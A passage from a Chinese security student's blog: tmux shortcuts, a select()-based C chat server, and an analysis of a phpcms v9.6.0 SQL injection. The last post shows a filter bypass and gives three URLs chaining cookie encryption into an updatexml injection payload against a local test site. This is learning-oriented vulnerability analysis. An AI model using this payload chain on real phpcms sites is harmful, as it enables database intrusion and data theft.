<li>ctrl+b n 选择下一个窗口</li>
<li>ctrl+b l 最后使用的窗口</li>
<li>ctrl+b p 选择前一个窗口</li>
<li>ctrl+b w 以菜单方式显示及选择窗口</li>
<li>ctrl+b s 以菜单方式显示和选择会话。这个常用到，可以选择进入哪个tmux</li>
<li>ctrl+b t 显示时钟。然后按enter键后就会恢复到shell终端状态</li>
<li>ctrl+b d 脱离当前会话；这样可以暂时返回Shell界面，输入tmux attach能够重新进入之前的会话</li>
</ul>
</li>
</ul>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/thinkings-on-select/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/thinkings-on-select/index.html" itemprop="url">
                  对select()的理解
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-12-15 00:56:25" itemprop="dateCreated datePublished" datetime="2017-12-15T00:56:25+08:00">2017-12-15</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/人生杂谈/技术学习/" itemprop="url" rel="index"><span itemprop="name">技术学习</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>断断续续的看<strong>Beej’s Guide to Network Programming</strong>这本小册子,最近看了select函数的用法,感觉这个函数挺有用而且听特殊,理解上有点儿难度,因此记录下来关于这个函数的一些东西.</p>
</blockquote>
<h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><pre><code>#include &lt;sys/time.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
int select(int numfds, fd_set *readfds, fd_set *writefds,
fd_set *exceptfds, struct timeval *timeout);
</code></pre><h3 id="fd-set"><a href="#fd-set" class="headerlink" title="fd_set"></a><code>fd_set</code></h3><p>这里的fd_set类型相当于一个file descriptor的集合.<br>当select()函数返回时,readfs中只含有可以读的file descriptor.writefs包含可写的descriptor,exceptfds包含出错的file descriptor .(此三个参数不必都有) fd_set有一些列的操作函数:</p>
<pre><code>FD_SET(int fd, fd_set *set); //Add fd to the set .
FD_CLR(int fd, fd_set *set); //Remove fd from the set .
FD_ISSET(int fd, fd_set *set); //Return true if fd is in the set .
FD_ZERO(fd_set *set); //Clear all entries from the set .
</code></pre><h3 id="timeval结构体"><a href="#timeval结构体" class="headerlink" title="timeval结构体"></a><code>timeval</code>结构体</h3><pre><code>struct timeval {
int tv_sec; //seconds
int tv_usec;// microseconds
};
</code></pre><p>此结构体表示select函数的超时时间.设置为NULL则永远等待. 此函数使用时,numfds应设置为最高的file descriptor的值.</p>
<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>返回set中最后剩下的的数目.0表示超时,-1表示出错.</p>
<h2 id="此函数如何使用的理解"><a href="#此函数如何使用的理解" class="headerlink" title="此函数如何使用的理解"></a>此函数如何使用的理解</h2><p>我们可以在开始的时候使用<code>FD_SET</code>将我们创建的服务端套接字描述符填入一个fd_set中,然后把这个fd_set复制一下传如select的readfds参数中然后用select监听,select有返回值后则遍历所有descriptors</p>
<ul>
<li>如果这个descriptor在这个新的readfds中(<code>FD_ISSET</code>)则说明可以read<ul>
<li>如果这个descriptor正好是我们最初的那个服务端套接字  <ul>
<li>则可以进行accept操作,然后将读到的这个socksetfd就可以传入我们的fd_set中,判断这个socketfd是否比原有的最大的socketfd大,大则替换<code>select()</code>函数的第一个参数为这个新的socketfd+1.</li>
</ul>
</li>
<li>如果这个descriptor不是最初的那个服务端套接字<ul>
<li>则说明是与某个主机的一个连接,则可以调用这个套接字的<code>recv()</code>方法接收数据,如果返回0说明这个套接字已经断开,可调用<code>FD_CLR</code>将其从最初的fd_set中清除出去.否则则进行其他的一些列操作.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="一个简单的demo"><a href="#一个简单的demo" class="headerlink" title="一个简单的demo"></a>一个简单的demo</h2><pre><code>/*
** ChatServer.cpp - a practise on select()
*/
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netdb.h&gt;

#define PORT &quot;3456&quot;
#define STDIN 0

void *get_in_addr(struct sockaddr *sa)
{
    if (sa-&gt;sa_family == AF_INET)
    {
        return &amp;(((struct sockaddr_in *)sa)-&gt;sin_addr);
    }
    else
        return &amp;(((struct sockaddr_in6 *)sa)-&gt;sin6_addr);
}

int main(void)
{
    fd_set master;
    fd_set read_fds;
    int fd_max;

    int listener;
    int newfd;
    struct sockaddr_storage remoteaddr;
    socklen_t addrlen;

    char buf[256];
    char mess[256];
    int nbytes;

    char remoteIP[INET6_ADDRSTRLEN];

    int yes = 1;
    int i, j, rv;
    struct addrinfo hints, *ai, *p;

    FD_ZERO(&amp;master);
    FD_ZERO(&amp;read_fds);

    memset(&amp;hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    if ((rv = getaddrinfo(NULL, PORT, &amp;hints, &amp;ai)) != 0)
    {
        fprintf(stderr, &quot;selectserver:%s\n&quot;, gai_strerror(rv));
        exit(1);
    }

    for (p = ai; p != NULL; p = p-&gt;ai_next)
    {
        listener = socket(p-&gt;ai_family, p-&gt;ai_socktype, p-&gt;ai_protocol);
        if (listener &lt; 0)
        {
            continue;
        }
        setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &amp;yes, sizeof(int));
        if (bind(listener, p-&gt;ai_addr, p-&gt;ai_addrlen) &lt; 0)
        {
            close(listener);
            continue;
        }
        break;
    }
    if (p == NULL)
    {
        fprintf(stderr, &quot;selectserver: failed to bind\n&quot;);
        exit(2);
    }
    freeaddrinfo(ai);
    if (listen(listener, 10) == -1)
    {
        perror(&quot;listen&quot;);
        exit(3);
    }
    FD_SET(listener, &amp;master);
    FD_SET(STDIN, &amp;master);
    fd_max = listener &gt; STDIN ? listener : STDIN;

    for (;;)
    {
        read_fds = master;
        if (select(fd_max + 1, &amp;read_fds, NULL, NULL, NULL) == -1)
        {
            perror(&quot;select&quot;);
            exit(4);
        }
        for (i = 0; i &lt;= fd_max; i++)
        {
            if (FD_ISSET(i, &amp;read_fds))
            { //we got one!!
                if (i == STDIN)
                {
                    fgets(buf, sizeof buf, stdin);
                    memset(mess, 0, sizeof mess);
                    sprintf(mess, &quot;server said:%s&quot;, buf);
                    for (j = 0; j &lt;= fd_max; j++)
                    {
                        if (FD_ISSET(j, &amp;master))
                        {
                            if (j != listener &amp;&amp; j != i &amp;&amp; j != STDIN)
                            {
                                if (send(j, mess, strlen(mess), 0) == -1)
                                {
                                    perror(&quot;send&quot;);
                                }
                            }
                        }
                    }
                }
                else if (i == listener)
                {
                    addrlen = sizeof remoteaddr;
                    newfd = accept(listener, (struct sockaddr *)&amp;remoteaddr, &amp;addrlen);
                    if (newfd == -1)
                    {
                        perror(&quot;accept&quot;);
                    }
                    else
                    {
                        FD_SET(newfd, &amp;master);
                        if (newfd &gt; fd_max)
                        {
                            fd_max = newfd;
                        }
                        printf(&quot;selectserver:new connection from %s on socket %d\n&quot;,
                               inet_ntop(remoteaddr.ss_family, get_in_addr((struct sockaddr *)&amp;remoteaddr), remoteIP, INET6_ADDRSTRLEN), newfd);
                        sprintf(buf, &quot;hello!!! your socket id is %d\n&quot;, newfd);
                        if (send(newfd, buf, strlen(buf), 0) == -1)
                        {
                            perror(&quot;send&quot;);
                        }
                        sprintf(buf, &quot;socket %d joined chatroom\n&quot;, newfd);
                        for (j = 0; j &lt; fd_max; j++)
                        {
                            if (FD_ISSET(j, &amp;master))
                            {
                                if (j != i &amp;&amp; j != listener &amp;&amp; j != STDIN)
                                {
                                    if (send(j, buf, strlen(buf), 0) == -1)
                                        perror(&quot;send&quot;);
                                }
                            }
                        }
                    }
                }
                else
                {
                    if ((nbytes = recv(i, buf, sizeof buf, 0)) &lt;= 0)
                    {
                        if (nbytes == 0)
                        {
                            sprintf(buf, &quot;select server: socket %d hung up\n&quot;, i);
                            printf(&quot;%s&quot;, buf);
                            for (j = 0; j &lt;= fd_max; j++)
                            {
                                if (FD_ISSET(j, &amp;master))
                                    if (j != listener &amp;&amp; j != i &amp;&amp; j != STDIN)
                                    {
                                        if (send(j, buf, strlen(buf), 0) == -1)
                                        {
                                            perror(&quot;send&quot;);
                                        }
                                    }
                            }
                        }
                        else
                        {
                            perror(&quot;recv&quot;);
                        }
                        close(i);
                        FD_CLR(i, &amp;master);
                    }
                    else
                    {
                        if (nbytes &lt;= 2)
                            nbytes = 3;
                        memset(mess, 0, sizeof mess);
                        strncpy(mess, buf, nbytes - 2);
                        printf(&quot;recv data %s from socket %d\n&quot;, mess, i);
                        sprintf(buf, &quot;socket %d says: %s\n&quot;, i, mess);
                        for (j = 0; j &lt;= fd_max; j++)
                        {
                            if (FD_ISSET(j, &amp;master))
                            {
                                if (j != listener &amp;&amp; j != i &amp;&amp; j != STDIN)
                                {
                                    if (send(j, buf, strlen(buf), 0) == -1)
                                    {
                                        perror(&quot;send&quot;);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    return 0;
}
</code></pre><blockquote>
<p>要特别注意一次select操作后readfs中只剩下了当前可读的fd.所以每次要复制一个副本穿进去.</p>
</blockquote>
<h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>还是认真学习认真思考能让人不那么丧…..庆幸自己找到了自己真正的兴趣所在.<br>不要让一些没意义的东西麻痹了自己. 要时刻提醒自己生存不易.<br>不高兴了就更更博,耐心看看技术书,让自己静一静.闲了就容易生事.<br>keep on moving!!!</p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/phpcmsv9sqli/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/phpcmsv9sqli/index.html" itemprop="url">
                  phpcms-v9.6.0sql注入漏洞分析[挖坟]
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-12-06 21:29:14" itemprop="dateCreated datePublished" datetime="2017-12-06T21:29:14+08:00">2017-12-06</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/技术学习/" itemprop="url" rel="index"><span itemprop="name">技术学习</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>还有几天就要翘课一个礼拜去深圳和厦门被各位大佬虐菜了…由于本菜鸡的代码审计一直是弱项,所以为了能打好这场比赛,这两天便找了一些代码和漏洞分析文章来学习学习.今天玩了一下这个好几个月之前的phpcms的漏洞,在差不多搞了个大概之后写了这篇文章来记录一下这个漏洞的原理.</p>
</blockquote>
<h2 id="0x01-phpcms的路由处理方式"><a href="#0x01-phpcms的路由处理方式" class="headerlink" title="0x01 phpcms的路由处理方式"></a>0x01 phpcms的路由处理方式</h2><p>index.php中,可以看到调用了pc_base::create_app()方法.跟进这个方法最后调用了_load_class()函数,参数为application.</p>
<pre><code>private static function _load_class($classname, $path = &apos;&apos;, $initialize = 1) {
        static $classes = array();
        if (empty($path)) $path = &apos;libs&apos;.DIRECTORY_SEPARATOR.&apos;classes&apos;;

        $key = md5($path.$classname);
        if (isset($classes[$key])) {
            if (!empty($classes[$key])) {
                return $classes[$key];
            } else {
                return true;
            }
        }
        if (file_exists(PC_PATH.$path.DIRECTORY_SEPARATOR.$classname.&apos;.class.php&apos;)) {
            include PC_PATH.$path.DIRECTORY_SEPARATOR.$classname.&apos;.class.php&apos;;
            $name = $classname;
            if ($my_path = self::my_path(PC_PATH.$path.DIRECTORY_SEPARATOR.$classname.&apos;.class.php&apos;)) {
                include $my_path;
                $name = &apos;MY_&apos;.$classname;
            }
            if ($initialize) {
                $classes[$key] = new $name;
            } else {
                $classes[$key] = true;
            }
            return $classes[$key];
        } else {
            return false;
        }
    }
</code></pre><p>跟进phpcms/libs/classes/application.class.php文件中</p>
<pre><code>&lt;?php
/**
 *  application.class.php PHPCMS应用程序创建类
 *
 * @copyright           (C) 2005-2010 PHPCMS
 * @license             http://www.phpcms.cn/license/
 * @lastmodify          2010-6-7
 */
class application {

    /**
     * 构造函数
     */
    public function __construct() {
        $param = pc_base::load_sys_class(&apos;param&apos;);
        define(&apos;ROUTE_M&apos;, $param-&gt;route_m());
        define(&apos;ROUTE_C&apos;, $param-&gt;route_c());
        define(&apos;ROUTE_A&apos;, $param-&gt;route_a());
        $this-&gt;init();
    }

    /**
     * 调用件事
     */
    private function init() {
        $controller = $this-&gt;load_controller();
        if (method_exists($controller, ROUTE_A)) {
            if (preg_match(&apos;/^[_]/i&apos;, ROUTE_A)) {
                exit(&apos;You are visiting the action is to protect the private action&apos;);
            } else {
                call_user_func(array($controller, ROUTE_A));
            }
        } else {
            exit(&apos;Action does not exist.&apos;);
        }
    }

    /**
     * 加载控制器
     * @param string $filename
     * @param string $m
     * @return obj
     */
    private function load_controller($filename = &apos;&apos;, $m = &apos;&apos;) {
        if (empty($filename)) $filename = ROUTE_C;
        if (empty($m)) $m = ROUTE_M;
        $filepath = PC_PATH.&apos;modules&apos;.DIRECTORY_SEPARATOR.$m.DIRECTORY_SEPARATOR.$filename.&apos;.php&apos;;
        if (file_exists($filepath)) {
            $classname = $filename;
            include $filepath;
            if ($mypath = pc_base::my_path($filepath)) {
                $classname = &apos;MY_&apos;.$filename;
                include $mypath;
            }
            if(class_exists($classname)){
                return new $classname;
            }else{
                exit(&apos;Controller does not exist.&apos;);
            }
        } else {
            exit(&apos;Controller does not exist.&apos;);
        }
    }
}
</code></pre><p>可以看到构造函数中将param的<strong>route_m</strong>,<strong>route_c</strong>,<strong>route_a</strong>作为为模块名,控制器,控制器的相关函数,然后调用init函数加载这个模块的相应控制器的相应函数.跟进/phpcms/libs/classes/param.class.php文件可以得知这三个成员变量分别来自<code>$_GET[&#39;m&#39;]</code>,<code>$_GET[&#39;c&#39;]</code>,<code>$_GET[&#39;a&#39;]</code>中. 由此可确定phpcms的路由规则:<code>index.php?m=module名称&amp;c=controller名称&amp;a=函数</code></p>
<h2 id="0x02-注入漏洞分析"><a href="#0x02-注入漏洞分析" class="headerlink" title="0x02 注入漏洞分析"></a>0x02 注入漏洞分析</h2><h3 id="phpcms中负责过滤的一个函数safe-replace"><a href="#phpcms中负责过滤的一个函数safe-replace" class="headerlink" title="phpcms中负责过滤的一个函数safe_replace"></a>phpcms中负责过滤的一个函数<strong>safe_replace</strong></h3><p>源码如下:</p>
<pre><code>function safe_replace($string) {
    $string = str_replace(&apos;%20&apos;,&apos;&apos;,$string);
    $string = str_replace(&apos;%27&apos;,&apos;&apos;,$string);
    $string = str_replace(&apos;%2527&apos;,&apos;&apos;,$string);
    $string = str_replace(&apos;*&apos;,&apos;&apos;,$string);
    $string = str_replace(&apos;&quot;&apos;,&apos;&quot;&apos;,$string);
    $string = str_replace(&quot;&apos;&quot;,&apos;&apos;,$string);
    $string = str_replace(&apos;&quot;&apos;,&apos;&apos;,$string);
    $string = str_replace(&apos;;&apos;,&apos;&apos;,$string);
    $string = str_replace(&apos;&lt;&apos;,&apos;&lt;&apos;,$string);
    $string = str_replace(&apos;&gt;&apos;,&apos;&gt;&apos;,$string);
    $string = str_replace(&quot;{&quot;,&apos;&apos;,$string);
    $string = str_replace(&apos;}&apos;,&apos;&apos;,$string);
    $string = str_replace(&apos;\\&apos;,&apos;&apos;,$string);
    return $string;
}
</code></pre><p>可以看到这个函数是可以绕过的,只要传参%*27即可绕过过滤.</p>
<h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><p>这个漏洞的注入点位于phpcms/modules/content/down.php文件中,代码如下:</p>
<pre><code>public function init() {
        $a_k = trim($_GET[&apos;a_k&apos;]);
        if(!isset($a_k)) showmessage(L(&apos;illegal_parameters&apos;));
        $a_k = sys_auth($a_k, &apos;DECODE&apos;, pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;));
        if(empty($a_k)) showmessage(L(&apos;illegal_parameters&apos;));
        unset($i,$m,$f);
        parse_str($a_k);
        if(isset($i)) $i = $id = intval($i);
        if(!isset($m)) showmessage(L(&apos;illegal_parameters&apos;));
        if(!isset($modelid)||!isset($catid)) showmessage(L(&apos;illegal_parameters&apos;));
        if(empty($f)) showmessage(L(&apos;url_invalid&apos;));
        $allow_visitor = 1;
        $MODEL = getcache(&apos;model&apos;,&apos;commons&apos;);
        $tablename = $this-&gt;db-&gt;table_name = $this-&gt;db-&gt;db_tablepre.$MODEL[$modelid][&apos;tablename&apos;];
        $this-&gt;db-&gt;table_name = $tablename.&apos;_data&apos;;
        $rs = $this-&gt;db-&gt;get_one(array(&apos;id&apos;=&gt;$id)); 
        $siteids = getcache(&apos;category_content&apos;,&apos;commons&apos;);
        $siteid = $siteids[$catid];
        $CATEGORYS = getcache(&apos;category_content_&apos;.$siteid,&apos;commons&apos;);
</code></pre><p>可以看到$a_k变量可控,对$a_k变量做一系列处理之后使用parse_str函数进行处理,这也是这个漏洞产生的一个重要原因.之后的几个变量都可以覆盖过去,可以看到$id变量被直接传递到了get_one函数中.跟进phpcms处理model相关的文件中<code>/phpcms/libs/classes/db_access.class.php</code>:</p>
<pre><code>/**
 * 获取单条记录查询
 * @param $where        查询条件
 * @param $data         需要查询的字段值[例`name`,`gender`,`birthday`]
 * @param $order        排序方式    [默认按数据库默认方式排序]
 * @param $group        分组方式    [默认为空]
 * @return array/null   数据查询结果集,如果不存在，则返回空
 */
final public function get_one($where = &apos;&apos;, $data = &apos;*&apos;, $order = &apos;&apos;, $group = &apos;&apos;) {
    if (is_array($where)) $where = $this-&gt;sqls($where);
    return $this-&gt;db-&gt;get_one($data, $this-&gt;table_name, $where, $order, $group);
}
    /**
 * 将数组转换为SQL语句
 * @param array $where 要生成的数组
 * @param string $font 连接串。
 */
final public function sqls($where, $font = &apos; AND &apos;) {
    if (is_array($where)) {
        $sql = &apos;&apos;;
        foreach ($where as $key=&gt;$val) {
            $sql .= $sql ? &quot; $font `$key` = &apos;$val&apos; &quot; : &quot; `$key` = &apos;$val&apos;&quot;;
        }
        return $sql;
    } else {
        return $where;
    }
}
</code></pre><p>调用get_one函数,跟进文件<code>/phpcms/libs/classes/db_mysqli.class.php</code>中</p>
<pre><code>/**
 * 获取单条记录查询
 * @param $data         需要查询的字段值[例`name`,`gender`,`birthday`]
 * @param $table        数据表
 * @param $where        查询条件
 * @param $order        排序方式    [默认按数据库默认方式排序]
 * @param $group        分组方式    [默认为空]
 * @return array/null   数据查询结果集,如果不存在，则返回空
 */
public function get_one($data, $table, $where = &apos;&apos;, $order = &apos;&apos;, $group = &apos;&apos;) {
    $where = $where == &apos;&apos; ? &apos;&apos; : &apos; WHERE &apos;.$where;
    $order = $order == &apos;&apos; ? &apos;&apos; : &apos; ORDER BY &apos;.$order;
    $group = $group == &apos;&apos; ? &apos;&apos; : &apos; GROUP BY &apos;.$group;
    $limit = &apos; LIMIT 1&apos;;
    $field = explode( &apos;,&apos;, $data);
    array_walk($field, array($this, &apos;add_special_char&apos;));
    $data = implode(&apos;,&apos;, $field);

    $sql = &apos;SELECT &apos;.$data.&apos; FROM `&apos;.$this-&gt;config[&apos;database&apos;].&apos;`.`&apos;.$table.&apos;`&apos;.$where.$group.$order.$limit;
    $this-&gt;execute($sql);
    $res = $this-&gt;fetch_next();
    $this-&gt;free_result();
    return $res;
}
</code></pre><p>可以看到最终$id被直接拼接到了sql语句中.因此可以进行注入.那么怎么控制$id的值? 回到down.php文件中</p>
<pre><code>public function init() {
        $a_k = trim($_GET[&apos;a_k&apos;]);
        if(!isset($a_k)) showmessage(L(&apos;illegal_parameters&apos;));
        $a_k = sys_auth($a_k, &apos;DECODE&apos;, pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;));
        if(empty($a_k)) showmessage(L(&apos;illegal_parameters&apos;));
        unset($i,$m,$f);
        parse_str($a_k);
        if(isset($i)) $i = $id = intval($i);
</code></pre><p>可以看到这个$a_k是从<code>$_GET[&#39;a_k&#39;]</code>解密得来的.只要找到一个加密的点即可控制输出.</p>
<h3 id="加密点"><a href="#加密点" class="headerlink" title="加密点"></a>加密点</h3><p>这里师傅们用的加密的点是<code>/phpcms/modules/attachment/attachments.php</code>文件中的函数<strong>swfupload_json</strong>.</p>
<pre><code>/**
 * 设置swfupload上传的json格式cookie
 */
public function swfupload_json() {
    $arr[&apos;aid&apos;] = intval($_GET[&apos;aid&apos;]);
    $arr[&apos;src&apos;] = safe_replace(trim($_GET[&apos;src&apos;]));
    $arr[&apos;filename&apos;] = urlencode(safe_replace($_GET[&apos;filename&apos;]));
    $json_str = json_encode($arr);
    $att_arr_exist = param::get_cookie(&apos;att_json&apos;);
    $att_arr_exist_tmp = explode(&apos;||&apos;, $att_arr_exist);
    if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) {
        return true;
    } else {
        $json_str = $att_arr_exist ? $att_arr_exist.&apos;||&apos;.$json_str : $json_str;
        param::set_cookie(&apos;att_json&apos;,$json_str);
        return true;            
    }
}
</code></pre><p>在这个函数中,将$_GET[‘src’]使用safe_replace()函数处理后进入$arr[‘src’]中,再对$arr进行json_encode,只要不存在att_json这样一个cookie或者$json_str不在数组中就会进入else的循环中,而跟进set_cookie函数则可发现phpcms输出的cookie值正好为加密后的cookie.因此我们便可以利用这个点来加密我们的注入语句. 然而phpcms的attachments类会进行一个用户身份的判断</p>
<pre><code>function __construct() {
    pc_base::load_app_func(&apos;global&apos;);
    $this-&gt;upload_url = pc_base::load_config(&apos;system&apos;,&apos;upload_url&apos;);
    $this-&gt;upload_path = pc_base::load_config(&apos;system&apos;,&apos;upload_path&apos;);      
    $this-&gt;imgext = array(&apos;jpg&apos;,&apos;gif&apos;,&apos;png&apos;,&apos;bmp&apos;,&apos;jpeg&apos;);
    $this-&gt;userid = $_SESSION[&apos;userid&apos;] ? $_SESSION[&apos;userid&apos;] : (param::get_cookie(&apos;_userid&apos;) ? param::get_cookie(&apos;_userid&apos;) : sys_auth($_POST[&apos;userid_flash&apos;],&apos;DECODE&apos;));
    $this-&gt;isadmin = $this-&gt;admin_username = $_SESSION[&apos;roleid&apos;] ? 1 : 0;
    $this-&gt;groupid = param::get_cookie(&apos;_groupid&apos;) ? param::get_cookie(&apos;_groupid&apos;) : 8;
    //判断是否登录
    if(empty($this-&gt;userid)){
        showmessage(L(&apos;please_login&apos;,&apos;&apos;,&apos;member&apos;));
    }
}
</code></pre><p>这里通过判断$this-&gt;userid来测试用户是否登录,可以发现userid除了可以来自于cookie外还可以来自于$_POST[‘userid_flash’]中. 这里师傅们使用的生成这个加密后的$_POST[‘userid_flash’]的点在<code>/phpcms/modules/wap/index.php</code>文件中:</p>
<pre><code>function __construct() {        
    $this-&gt;db = pc_base::load_model(&apos;content_model&apos;);
    $this-&gt;siteid = isset($_GET[&apos;siteid&apos;]) &amp;&amp; (intval($_GET[&apos;siteid&apos;]) &gt; 0) ? intval(trim($_GET[&apos;siteid&apos;])) : (param::get_cookie(&apos;siteid&apos;) ? param::get_cookie(&apos;siteid&apos;) : 1);
    param::set_cookie(&apos;siteid&apos;,$this-&gt;siteid);  
    $this-&gt;wap_site = getcache(&apos;wap_site&apos;,&apos;wap&apos;);
    $this-&gt;types = getcache(&apos;wap_type&apos;,&apos;wap&apos;);
    $this-&gt;wap = $this-&gt;wap_site[$this-&gt;siteid];
    define(&apos;WAP_SITEURL&apos;, $this-&gt;wap[&apos;domain&apos;] ? $this-&gt;wap[&apos;domain&apos;].&apos;index.php?&apos; : APP_PATH.&apos;index.php?m=wap&amp;siteid=&apos;.$this-&gt;siteid);
    if($this-&gt;wap[&apos;status&apos;]!=1) exit(L(&apos;wap_close_status&apos;));
}

//展示首页
public function init() {
    $WAP = $this-&gt;wap;
    $TYPE = $this-&gt;types;
    $WAP_SETTING = string2array($WAP[&apos;setting&apos;]);
    $GLOBALS[&apos;siteid&apos;] = $siteid = max($this-&gt;siteid,1);
    $template = $WAP_SETTING[&apos;index_template&apos;] ? $WAP_SETTING[&apos;index_template&apos;] : &apos;index&apos;;
    include template(&apos;wap&apos;, $template);
}
</code></pre><p>设置了一个siteid的cookie,可以利用这个cookie的值传入到之前的那个$_POST[‘userid_flash’]中.</p>
<h2 id="0x03-注入验证"><a href="#0x03-注入验证" class="headerlink" title="0x03 注入验证"></a>0x03 注入验证</h2><h3 id="Step1-获取之前的userid"><a href="#Step1-获取之前的userid" class="headerlink" title="Step1 获取之前的userid"></a>Step1 获取之前的userid</h3><p>访问<code>http://127.0.0.1/phpcms2/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1</code>,获取cookie中的siteid值. <img src="http://blog.imagemlt.xyz/wp-content/uploads/2017/12/1.png" alt="图片1"></p>
<h3 id="Step2-获取加密后的sql语句"><a href="#Step2-获取加密后的sql语句" class="headerlink" title="Step2 获取加密后的sql语句"></a>Step2 获取加密后的sql语句</h3><p>访问<code>http://127.0.0.1/phpcms2/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id%3d%25*27+and+updatexml(1,concat(0x7e,database()),0x7e)%23%26m%3d1%26f%3dhaha%26modelid%3d2%26catid%3d7%26&amp;</code>,获取cookie中att_json值. <img src="http://blog.imagemlt.xyz/wp-content/uploads/2017/12/2.png" alt="图片2"></p>
<h3 id="Step3-执行注入"><a href="#Step3-执行注入" class="headerlink" title="Step3 执行注入"></a>Step3 执行注入</h3><p>访问<code>http://127.0.0.1/phpcms2/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=加密后的字符串</code>,即可验证. <img src="http://blog.imagemlt.xyz/wp-content/uploads/2017/12/3.png" alt="图片3"></p>
<h2 id="0x04-参考文件"><a href="#0x04-参考文件" class="headerlink" title="0x04 参考文件"></a>0x04 参考文件</h2><ul>
